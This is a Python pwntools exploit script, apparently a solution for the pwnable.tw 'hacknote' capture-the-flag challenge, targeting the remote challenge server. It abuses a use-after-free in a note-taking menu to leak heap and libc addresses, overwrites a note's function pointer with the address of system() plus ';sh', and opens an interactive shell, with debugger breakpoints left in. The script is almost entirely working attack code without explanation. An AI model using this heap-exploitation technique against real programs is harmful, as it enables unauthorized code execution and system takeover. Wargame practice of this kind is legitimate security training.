


from pwn import *
import pdb


def add_note(sz, cont):
  p.sendlineafter('Your choice :', '1')
  p.sendlineafter('Note size :', str(sz))
  p.sendlineafter('Content :', cont)

def del_note(idx):
  p.sendlineafter('Your choice :', '2')
  p.sendlineafter('Index :', str(idx))

def print_note(idx, sz = 8):
  p.sendlineafter('Your choice :', '3')
  p.sendlineafter('Index :', str(idx))
  # cont = p.recvuntil('-')[:-1]
  if sz > 0:
    cont = p.recv(sz)
  elif sz == 0:
    return None
  else:
    cont = p.recvline()

  return cont

def _exit():
  p.sendlineafter('Your choice :', '4')


# context.log_level = 'debug'
# p = process('/home/len/pwnable/hacknote')
p = remote('chall.pwnable.tw', 10102)

print_addr = 0x0804862b

# local
# main_arena_offset = 0x1b3780
# system_offset = 0x3adb0


# remote
main_arena_offset = 0x1b0780
system_offset = 0x3A940

unsorted_bin_offset = 0x30
sh_offset = 0xf0

if __name__ == "__main__":
  sz = 0x20
  add_note(sz, 'a' * sz) # 0

  sz = 0x80
  add_note(sz, 'b' * sz) # 1

  sz = 0x20
  add_note(sz, '/bin/sh\x00') # 2

  pdb.set_trace()
  del_note(1)
  del_note(0)
  # del_note(2)

  pdb.set_trace()
  sz = 0x4
  add_note(sz, p32(print_addr)) # 3

  cont = print_note(0)
  heapbase_addr = u32(cont[4:8]) - 0x50
  print('heapbase_addr: {:#x}'.format(heapbase_addr))

  sh_addr = heapbase_addr + sh_offset
  print('sh_addr: {:#x}'.format(sh_addr))

  cont = print_note(1)
  unsorted_bin_addr = u32(cont[:4])
  print('unsorted_bin_addr: {:#x}'.format(unsorted_bin_addr))

  main_arena_addr = unsorted_bin_addr - unsorted_bin_offset
  print('main_arena_addr: {:#x}'.format(main_arena_addr))

  libc_addr = main_arena_addr - main_arena_offset
  print('libc_addr: {:#x}'.format(libc_addr))

  system_addr = libc_addr + system_offset
  print('system_addr: {:#x}'.format(system_addr))

  pdb.set_trace()
  del_note(3)
  add_note(0x8, p32(system_addr)+';sh')

  print_note(1, 0)
  p.interactive()

  

  # ptr system_bin
